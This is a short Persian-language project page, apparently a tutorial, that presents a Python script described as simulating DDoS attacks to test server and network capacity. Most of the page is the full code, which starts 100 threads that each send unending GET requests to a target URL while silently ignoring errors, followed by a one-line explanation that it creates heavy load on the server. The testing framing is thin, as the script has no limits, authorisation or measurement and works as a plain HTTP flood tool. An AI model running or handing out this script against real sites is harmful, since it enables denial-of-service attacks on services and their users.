توضیح کلی پروژه

در این پروژه، حملات DDoS برای تست ظرفیت سرورها و شبکه‌ها شبیه‌سازی می‌شود.

پیش‌نیازها

  • آشنایی با زبان پایتون
  • کتابخانه requests و threading

کدهای کامل

import threading import requests def send_request(url): while True: try: requests.get(url) print("Request Sent!") except: pass url = "http://example.com" threads = [] for i in range(100): thread = threading.Thread(target=send_request, args=(url,)) threads.append(thread) thread.start()

توضیح کدها

این اسکریپت با استفاده از threading چندین درخواست همزمان به سرور ارسال می‌کند تا بار زیادی ایجاد شود.
